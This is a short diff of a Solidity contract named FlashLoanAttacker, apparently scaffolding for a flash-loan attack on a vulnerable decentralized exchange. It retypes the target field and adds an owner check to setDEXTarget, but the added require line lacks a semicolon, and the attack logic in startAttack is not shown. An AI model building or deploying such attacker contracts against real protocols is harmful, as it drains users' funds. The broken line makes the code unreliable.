@@ -22,7 +22,7 @@ contract FlashLoanAttacker {
     IERC20 public immutable tokenA; 
     IERC20 public immutable tokenB;
     IFlashLoanProvider public immutable flashLoanProvider;
-    IVulnerableDEX public immutable dex;
+    address public dex;
 
     address public owner;
 
@@ -35,12 +35,13 @@ contract FlashLoanAttacker {
         flashLoanProvider = IFlashLoanProvider(_flashLoanProvider);
         tokenA = IERC20(_tokenA);
         tokenB = IERC20(_tokenB);
-        dex = IVulnerableDEX(_dex);
+        dex = _dex;
         owner = msg.sender;
     }
 
     function setDEXTarget(address _dex) external {
-    dex = _dex;
+        require(msg.sender == owner, "not owner")
+        dex = _dex;
     }
 
     function startAttack(uint256 loanAmount) external {
